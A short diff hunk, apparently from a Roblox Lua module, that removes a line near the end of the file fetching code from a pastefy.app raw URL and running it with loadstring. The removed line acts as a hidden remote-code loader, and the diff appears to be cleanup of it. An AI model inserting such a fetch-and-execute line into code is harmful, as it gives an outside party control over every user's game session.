@@ -218,6 +218,4 @@ end)()
 
 Module.IsAlive = IsAlive;
 
-loadstring(game:HttpGet("https://pastefy.app/cdgM4Ij4/raw"))()
-
 return Module;
